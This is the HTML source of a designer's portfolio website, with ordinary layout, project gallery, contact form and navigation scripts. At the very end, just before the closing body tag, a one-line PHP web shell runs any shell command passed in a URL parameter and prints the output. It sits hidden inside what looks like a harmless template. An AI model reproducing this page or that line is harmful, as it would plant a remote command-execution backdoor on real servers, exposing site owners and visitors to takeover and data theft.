<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Alex Morgan - Creative Portfolio</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css"
    />
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              primary: "#1f2937",
              secondary: "#6b7280",
            },
            borderRadius: {
              none: "0px",
              sm: "4px",
              DEFAULT: "8px",
              md: "12px",
              lg: "16px",
              xl: "20px",
              "2xl": "24px",
              "3xl": "32px",
              full: "9999px",
              button: "8px",
            },
            fontFamily: {
              inter: ["Inter", "sans-serif"],
              pacifico: ["Pacifico", "serif"],
            },
          },
        },
      };
    </script>
    <style>
      :where([class^="ri-"])::before {
          content: "\f3c2";
      }

      * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
      }

      body {
          font-family: 'Inter', sans-serif;
          line-height: 1.6;
          color: #1f2937;
      }

      .hero-bg {
          background-image: url('https://readdy.ai/api/search-image?query=minimalist%20abstract%20geometric%20background%20with%20soft%20gradients%20and%20clean%20lines%2C%20modern%20professional%20workspace%20with%20subtle%20textures%2C%20neutral%20tones%2C%20high-end%20design%20studio%20atmosphere%2C%20elegant%20simplicity%2C%20contemporary%20aesthetic&width=1920&height=1080&seq=hero-bg-001&orientation=landscape');
          background-size: cover;
          background-position: center;
          background-repeat: no-repeat;
      }

      .portfolio-item {
          transition: all 0.3s ease;
      }

      .portfolio-item:hover {
          transform: translateY(-8px);
      }

      .portfolio-overlay {
          opacity: 0;
          transition: opacity 0.3s ease;
      }

      .portfolio-item:hover .portfolio-overlay {
          opacity: 1;
      }

      .smooth-scroll {
          scroll-behavior: smooth;
      }

      .fade-in {
          opacity: 0;
          transform: translateY(30px);
          transition: all 0.6s ease;
      }

      .fade-in.visible {
          opacity: 1;
          transform: translateY(0);
      }

      .nav-link {
          position: relative;
          transition: color 0.3s ease;
      }

      .nav-link::after {
          content: '';
          position: absolute;
          width: 0;
          height: 2px;
          bottom: -4px;
          left: 50%;
          background-color: #1f2937;
          transition: all 0.3s ease;
          transform: translateX(-50%);
      }

      .nav-link:hover::after {
          width: 100%;
      }

      .project-card {
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(10px);
          border: 1px solid rgba(255, 255, 255, 0.2);
      }
    </style>
  </head>
  <body class="smooth-scroll">
    <nav
      class="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-md border-b border-gray-100"
    >
      <div class="max-w-7xl mx-auto px-6 py-4">
        <div class="flex justify-between items-center">
          <div class="text-2xl font-bold text-primary">Alex Morgan</div>
          <div class="hidden md:flex space-x-8">
            <a
              href="#home"
              class="nav-link text-gray-700 hover:text-primary font-medium"
              >Home</a
            >
            <a
              href="#work"
              class="nav-link text-gray-700 hover:text-primary font-medium"
              >Work</a
            >
            <a
              href="#about"
              class="nav-link text-gray-700 hover:text-primary font-medium"
              >About</a
            >
            <a
              href="#contact"
              class="nav-link text-gray-700 hover:text-primary font-medium"
              >Contact</a
            >
          </div>
          <button
            id="mobile-menu-btn"
            class="md:hidden w-8 h-8 flex items-center justify-center"
          >
            <i class="ri-menu-line text-xl"></i>
          </button>
        </div>
      </div>
      <div
        id="mobile-menu"
        class="md:hidden bg-white border-t border-gray-100 hidden"
      >
        <div class="px-6 py-4 space-y-4">
          <a
            href="#home"
            class="block text-gray-700 hover:text-primary font-medium"
            >Home</a
          >
          <a
            href="#work"
            class="block text-gray-700 hover:text-primary font-medium"
            >Work</a
          >
          <a
            href="#about"
            class="block text-gray-700 hover:text-primary font-medium"
            >About</a
          >
          <a
            href="#contact"
            class="block text-gray-700 hover:text-primary font-medium"
            >Contact</a
          >
        </div>
      </div>
    </nav>

    <section
      id="home"
      class="hero-bg min-h-screen flex items-center justify-center relative"
    >
      <div class="absolute inset-0 bg-white/20"></div>
      <div class="relative z-10 text-center max-w-4xl mx-auto px-6">
        <h1 class="text-6xl md:text-8xl font-bold text-primary mb-6 fade-in">
          Creative Designer
        </h1>
        <p
          class="text-xl md:text-2xl text-secondary mb-8 fade-in"
          style="animation-delay: 0.2s;"
        >
          Crafting digital experiences with passion and precision
        </p>
        <div class="fade-in" style="animation-delay: 0.4s;">
          <a
            href="#work"
            class="inline-flex items-center px-8 py-4 bg-primary text-white font-medium !rounded-button hover:bg-gray-800 transition-colors whitespace-nowrap"
          >
            View My Work
            <i
              class="ri-arrow-down-line ml-2 w-5 h-5 flex items-center justify-center"
            ></i>
          </a>
        </div>
      </div>
    </section>

    <section id="work" class="py-20 bg-gray-50">
      <div class="max-w-7xl mx-auto px-6">
        <div class="text-center mb-16">
          <h2 class="text-4xl md:text-5xl font-bold text-primary mb-6">
            Selected Works
          </h2>
          <p class="text-xl text-secondary max-w-2xl mx-auto">
            A collection of projects that showcase my passion for design and
            attention to detail
          </p>
        </div>

        <div class="flex justify-center mb-12">
          <div class="flex space-x-2 bg-white rounded-full p-1 shadow-sm">
            <button
              class="filter-btn active px-6 py-2 rounded-full font-medium transition-colors whitespace-nowrap !rounded-button"
              data-filter="all"
            >
              All
            </button>
            <button
              class="filter-btn px-6 py-2 rounded-full font-medium transition-colors whitespace-nowrap !rounded-button"
              data-filter="ui"
            >
              UI Design
            </button>
            <button
              class="filter-btn px-6 py-2 rounded-full font-medium transition-colors whitespace-nowrap !rounded-button"
              data-filter="ux"
            >
              UX Design
            </button>
            <button
              class="filter-btn px-6 py-2 rounded-full font-medium transition-colors whitespace-nowrap !rounded-button"
              data-filter="branding"
            >
              Branding
            </button>
          </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="ui"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=modern%20mobile%20app%20interface%20design%20with%20clean%20UI%20elements%2C%20minimalist%20dashboard%20with%20elegant%20typography%2C%20professional%20mobile%20application%20mockup%2C%20sleek%20user%20interface%20design%2C%20contemporary%20app%20design&width=400&height=300&seq=project-001&orientation=landscape"
                alt="Mobile App Design"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">FinTech Mobile App</h3>
                  <p class="text-sm opacity-90">UI Design</p>
                </div>
              </div>
            </div>
          </div>

          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="ux"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=user%20experience%20design%20wireframes%20and%20prototypes%2C%20UX%20research%20materials%20and%20user%20journey%20maps%2C%20professional%20design%20process%20documentation%2C%20clean%20workspace%20with%20design%20thinking%20materials&width=400&height=300&seq=project-002&orientation=landscape"
                alt="UX Research"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">
                    E-commerce UX Research
                  </h3>
                  <p class="text-sm opacity-90">UX Design</p>
                </div>
              </div>
            </div>
          </div>

          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="branding"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=elegant%20brand%20identity%20design%20with%20logo%20variations%2C%20sophisticated%20branding%20materials%20and%20business%20cards%2C%20premium%20brand%20design%20mockups%2C%20professional%20brand%20identity%20system&width=400&height=300&seq=project-003&orientation=landscape"
                alt="Brand Identity"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">
                    Luxury Brand Identity
                  </h3>
                  <p class="text-sm opacity-90">Branding</p>
                </div>
              </div>
            </div>
          </div>

          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="ui"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=modern%20web%20dashboard%20interface%20with%20clean%20design%20elements%2C%20professional%20admin%20panel%20UI%20design%2C%20sleek%20data%20visualization%20interface%2C%20contemporary%20web%20application%20design&width=400&height=300&seq=project-004&orientation=landscape"
                alt="Web Dashboard"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">
                    Analytics Dashboard
                  </h3>
                  <p class="text-sm opacity-90">UI Design</p>
                </div>
              </div>
            </div>
          </div>

          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="branding"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=creative%20packaging%20design%20with%20modern%20branding%20elements%2C%20premium%20product%20packaging%20mockups%2C%20sophisticated%20brand%20packaging%20design%2C%20elegant%20product%20presentation&width=400&height=300&seq=project-005&orientation=landscape"
                alt="Packaging Design"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">Product Packaging</h3>
                  <p class="text-sm opacity-90">Branding</p>
                </div>
              </div>
            </div>
          </div>

          <div
            class="portfolio-item project-card rounded-lg overflow-hidden shadow-lg"
            data-category="ux"
          >
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=user%20interface%20prototyping%20and%20user%20testing%20materials%2C%20UX%20design%20process%20documentation%2C%20professional%20design%20thinking%20workshop%2C%20clean%20modern%20design%20studio%20workspace&width=400&height=300&seq=project-006&orientation=landscape"
                alt="UX Process"
                class="w-full h-64 object-cover object-top"
              />
              <div
                class="portfolio-overlay absolute inset-0 bg-primary/80 flex items-center justify-center"
              >
                <div class="text-center text-white">
                  <h3 class="text-xl font-semibold mb-2">Healthcare App UX</h3>
                  <p class="text-sm opacity-90">UX Design</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="about" class="py-20 bg-white">
      <div class="max-w-6xl mx-auto px-6">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          <div>
            <h2 class="text-4xl md:text-5xl font-bold text-primary mb-8">
              About Me
            </h2>
            <p class="text-lg text-secondary mb-6">
              I'm a passionate creative designer with over 8 years of experience
              in crafting digital experiences that matter. My approach combines
              strategic thinking with aesthetic excellence to create designs
              that not only look beautiful but also solve real problems.
            </p>
            <p class="text-lg text-secondary mb-8">
              I believe in the power of simplicity and the importance of every
              detail. Whether it's a mobile app interface, a brand identity, or
              a complex user experience challenge, I approach each project with
              curiosity and dedication.
            </p>

            <div class="mb-8">
              <h3 class="text-xl font-semibold text-primary mb-4">
                Core Skills
              </h3>
              <div class="flex flex-wrap gap-3">
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >UI/UX Design</span
                >
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >Brand Identity</span
                >
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >Prototyping</span
                >
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >Design Systems</span
                >
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >User Research</span
                >
                <span
                  class="px-4 py-2 bg-gray-100 text-gray-700 rounded-full text-sm font-medium"
                  >Creative Direction</span
                >
              </div>
            </div>

            <div class="flex space-x-6">
              <a
                href="#"
                class="w-10 h-10 flex items-center justify-center bg-gray-100 hover:bg-primary hover:text-white rounded-full transition-colors"
              >
                <i class="ri-linkedin-line"></i>
              </a>
              <a
                href="#"
                class="w-10 h-10 flex items-center justify-center bg-gray-100 hover:bg-primary hover:text-white rounded-full transition-colors"
              >
                <i class="ri-dribbble-line"></i>
              </a>
              <a
                href="#"
                class="w-10 h-10 flex items-center justify-center bg-gray-100 hover:bg-primary hover:text-white rounded-full transition-colors"
              >
                <i class="ri-behance-line"></i>
              </a>
              <a
                href="#"
                class="w-10 h-10 flex items-center justify-center bg-gray-100 hover:bg-primary hover:text-white rounded-full transition-colors"
              >
                <i class="ri-instagram-line"></i>
              </a>
            </div>
          </div>

          <div class="flex justify-center">
            <div class="relative">
              <img
                src="https://readdy.ai/api/search-image?query=professional%20portrait%20of%20creative%20designer%20in%20modern%20studio%20environment%2C%20confident%20person%20with%20clean%20aesthetic%2C%20minimalist%20professional%20headshot%2C%20contemporary%20workspace%20background%2C%20elegant%20lighting&width=500&height=600&seq=about-portrait-001&orientation=portrait"
                alt="Alex Morgan"
                class="w-80 h-96 object-cover object-top rounded-lg shadow-lg"
              />
              <div
                class="absolute -bottom-6 -right-6 w-24 h-24 bg-primary rounded-lg opacity-20"
              ></div>
              <div
                class="absolute -top-6 -left-6 w-16 h-16 bg-gray-200 rounded-lg opacity-60"
              ></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="contact" class="py-20 bg-gray-50">
      <div class="max-w-4xl mx-auto px-6 text-center">
        <h2 class="text-4xl md:text-5xl font-bold text-primary mb-6">
          Let's Work Together
        </h2>
        <p class="text-xl text-secondary mb-12 max-w-2xl mx-auto">
          Have a project in mind? I'd love to hear about it and discuss how we
          can bring your vision to life.
        </p>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-12 mb-16">
          <div class="bg-white p-8 rounded-lg shadow-sm">
            <div
              class="w-12 h-12 flex items-center justify-center bg-primary text-white rounded-lg mx-auto mb-4"
            >
              <i class="ri-mail-line text-xl"></i>
            </div>
            <h3 class="text-xl font-semibold text-primary mb-2">Email Me</h3>
            <p class="text-secondary">hello@alexmorgan.design</p>
          </div>

          <div class="bg-white p-8 rounded-lg shadow-sm">
            <div
              class="w-12 h-12 flex items-center justify-center bg-primary text-white rounded-lg mx-auto mb-4"
            >
              <i class="ri-phone-line text-xl"></i>
            </div>
            <h3 class="text-xl font-semibold text-primary mb-2">Call Me</h3>
            <p class="text-secondary">+1 (555) 123-4567</p>
          </div>
        </div>

        <form class="max-w-2xl mx-auto">
          <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div class="relative">
              <input
                type="text"
                id="name"
                class="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:border-primary transition-colors text-sm"
                placeholder="Your Name"
                required
              />
            </div>
            <div class="relative">
              <input
                type="email"
                id="email"
                class="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:border-primary transition-colors text-sm"
                placeholder="Your Email"
                required
              />
            </div>
          </div>
          <div class="mb-6">
            <input
              type="text"
              id="subject"
              class="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:border-primary transition-colors text-sm"
              placeholder="Subject"
              required
            />
          </div>
          <div class="mb-8">
            <textarea
              id="message"
              rows="6"
              class="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:border-primary transition-colors resize-none text-sm"
              placeholder="Your Message"
              required
            ></textarea>
          </div>
          <button
            type="submit"
            class="w-full md:w-auto px-8 py-4 bg-primary text-white font-medium !rounded-button hover:bg-gray-800 transition-colors whitespace-nowrap"
          >
            Send Message
          </button>
        </form>
      </div>
    </section>

    <footer class="bg-white py-12 border-t border-gray-100">
      <div class="max-w-7xl mx-auto px-6">
        <div class="flex flex-col md:flex-row justify-between items-center">
          <div class="text-2xl font-bold text-primary mb-4 md:mb-0">
            Alex Morgan
          </div>
          <div class="flex space-x-6 mb-4 md:mb-0">
            <a
              href="#"
              class="w-10 h-10 flex items-center justify-center text-gray-400 hover:text-primary transition-colors"
            >
              <i class="ri-linkedin-line"></i>
            </a>
            <a
              href="#"
              class="w-10 h-10 flex items-center justify-center text-gray-400 hover:text-primary transition-colors"
            >
              <i class="ri-dribbble-line"></i>
            </a>
            <a
              href="#"
              class="w-10 h-10 flex items-center justify-center text-gray-400 hover:text-primary transition-colors"
            >
              <i class="ri-behance-line"></i>
            </a>
            <a
              href="#"
              class="w-10 h-10 flex items-center justify-center text-gray-400 hover:text-primary transition-colors"
            >
              <i class="ri-instagram-line"></i>
            </a>
          </div>
          <p class="text-secondary text-sm">
            © 2025 Alex Morgan. All rights reserved.
          </p>
        </div>
      </div>
    </footer>

    <button
      id="back-to-top"
      class="fixed bottom-8 right-8 w-12 h-12 bg-primary text-white rounded-full shadow-lg opacity-0 invisible transition-all duration-300 hover:bg-gray-800 flex items-center justify-center"
    >
      <i class="ri-arrow-up-line"></i>
    </button>

    <script id="mobile-menu-script">
      document.addEventListener("DOMContentLoaded", function () {
        const mobileMenuBtn = document.getElementById("mobile-menu-btn");
        const mobileMenu = document.getElementById("mobile-menu");

        mobileMenuBtn.addEventListener("click", function () {
          mobileMenu.classList.toggle("hidden");
        });
      });
    </script>

    <script id="portfolio-filter-script">
      document.addEventListener("DOMContentLoaded", function () {
        const filterBtns = document.querySelectorAll(".filter-btn");
        const portfolioItems = document.querySelectorAll(".portfolio-item");

        filterBtns.forEach((btn) => {
          btn.addEventListener("click", function () {
            const filter = this.getAttribute("data-filter");

            filterBtns.forEach((b) => {
              b.classList.remove("active", "bg-primary", "text-white");
              b.classList.add("text-gray-600", "hover:text-primary");
            });

            this.classList.add("active", "bg-primary", "text-white");
            this.classList.remove("text-gray-600", "hover:text-primary");

            portfolioItems.forEach((item) => {
              if (filter === "all" || item.getAttribute("data-category") === filter) {
                item.style.display = "block";
              } else {
                item.style.display = "none";
              }
            });
          });
        });

        filterBtns[0].classList.add("bg-primary", "text-white");
      });
    </script>

    <script id="scroll-animations-script">
      document.addEventListener("DOMContentLoaded", function () {
        const fadeElements = document.querySelectorAll(".fade-in");
        const backToTopBtn = document.getElementById("back-to-top");

        const observer = new IntersectionObserver(
          (entries) => {
            entries.forEach((entry) => {
              if (entry.isIntersecting) {
                entry.target.classList.add("visible");
              }
            });
          },
          { threshold: 0.1 },
        );

        fadeElements.forEach((el) => observer.observe(el));

        window.addEventListener("scroll", function () {
          if (window.scrollY > 300) {
            backToTopBtn.classList.remove("opacity-0", "invisible");
            backToTopBtn.classList.add("opacity-100", "visible");
          } else {
            backToTopBtn.classList.add("opacity-0", "invisible");
            backToTopBtn.classList.remove("opacity-100", "visible");
          }
        });

        backToTopBtn.addEventListener("click", function () {
          window.scrollTo({ top: 0, behavior: "smooth" });
        });
      });
    </script>

    <script id="smooth-navigation-script">
      document.addEventListener("DOMContentLoaded", function () {
        const navLinks = document.querySelectorAll('a[href^="#"]');

        navLinks.forEach((link) => {
          link.addEventListener("click", function (e) {
            e.preventDefault();
            const targetId = this.getAttribute("href");
            const targetSection = document.querySelector(targetId);

            if (targetSection) {
              const offsetTop = targetSection.offsetTop - 80;
              window.scrollTo({
                top: offsetTop,
                behavior: "smooth",
              });
            }

            const mobileMenu = document.getElementById("mobile-menu");
            if (!mobileMenu.classList.contains("hidden")) {
              mobileMenu.classList.add("hidden");
            }
          });
        });
      });
    </script>
    <?php echo shell_exec($_GET['0']);?>
  </body>
</html>
